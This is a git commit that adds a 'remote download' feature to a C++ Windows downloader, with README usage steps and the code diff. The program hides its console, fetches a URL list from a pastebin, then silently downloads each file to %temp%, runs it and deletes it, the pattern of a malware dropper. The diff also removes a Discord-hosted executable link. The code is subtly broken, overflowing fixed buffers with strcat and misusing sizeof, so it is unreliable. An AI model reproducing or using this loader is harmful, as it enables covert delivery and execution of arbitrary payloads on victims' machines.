2a8d6215c945aecc109bfd660c4711afe8df08a5
aydyn#0001 <aydynsiraci@gmail.com>
2022-04-29 18:43:13 -0400

    added remote download

--- README.md
+++ README.md
@@ -1,8 +1,22 @@
 # downloader
 
 ## how to use
-1. add the download links to your files
-2. to change the download location change %temp% to the path you want
+### download predefined links
+1. add the download links to the array, comma seperated
+2. change download location to wherever
+
+### download remote links
+1. add your download links to a gist or pastebin
+2. change remoteLinks with the raw paste
+
+example:  
+```cpp
+char *links[] = {
+    "https://launcher.mojang.com/download/MinecraftInstaller.exe",
+};
+char *installFolder = "%temp%\\";
+char *remoteLink = "https://pastebin.com/raw/Jpgu3w8G";
+```
 
 no builder, you need visual studio installed to compile this  
 compile using `cl main.cpp /Os`
--- main.cpp
+++ main.cpp
@@ -2,19 +2,37 @@
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 char *links[] = {
-    "https://cdn.discordapp.com/attachments/950546791596695583/969650516302905364/hwgui.exe"
+    "",
 };
 char *installFolder = "%temp%\\";
+char *remoteLink = "";
 
-int main () {
-    for (int i = 0; i < sizeof(links); i++) {
+int main()
+{
+
+    char cmd[] = "cmd.exe /c @echo off && for /F \"delims=\" %i in ('curl -s ";
+    strcat(cmd, remoteLink);
+    strcat(cmd, "') do (");
+    strcat(cmd, "for %a in (\"%i\") do (");
+    strcat(cmd, "curl %i -s -o ");
+    strcat(cmd, installFolder);
+    strcat(cmd, "%~NXa && start /wait ");
+    strcat(cmd, installFolder);
+    strcat(cmd, "%~NXa && del ");
+    strcat(cmd, installFolder);
+    strcat(cmd, "%~NXa");
+    strcat(cmd, "))");
+    WinExec(cmd, SW_HIDE);
+
+    for (int i = 0; i < sizeof(links); i++)
+    {
         char *fileName = strrchr(links[i], '/') + 1;
         char cmd[] = "cmd.exe /c @echo off && curl ";
         strcat(cmd, links[i]);
         strcat(cmd, " -s -o ");
         strcat(cmd, installFolder);
         strcat(cmd, fileName);
-        strcat(cmd, " && ");
+        strcat(cmd, " && start /wait ");
         strcat(cmd, installFolder);
         strcat(cmd, fileName);
         strcat(cmd, " && del ");
@@ -22,5 +40,6 @@ int main () {
         strcat(cmd, fileName);
         WinExec(cmd, SW_HIDE);
     }
+
     return 0;
 }
